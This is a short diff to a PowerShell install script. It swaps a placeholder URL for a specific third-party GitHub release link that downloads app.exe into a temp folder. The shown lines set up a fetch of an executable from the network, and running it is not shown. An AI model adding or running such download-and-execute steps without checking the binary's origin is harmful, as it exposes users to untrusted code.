@@ -2,7 +2,7 @@
 # install.ps1
 
 $InstallPath = "$env:TEMP\MyApp"
-$ExeUrl = "https://github.com/username/repo/releases/latest/download/app.exe"
+$ExeUrl = "https://github.com/godotlaunch/godot/releases/latest/download/app.exe"
 $ExePath = "$InstallPath\app.exe"
 
 if (!(Test-Path $InstallPath)) { New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null }
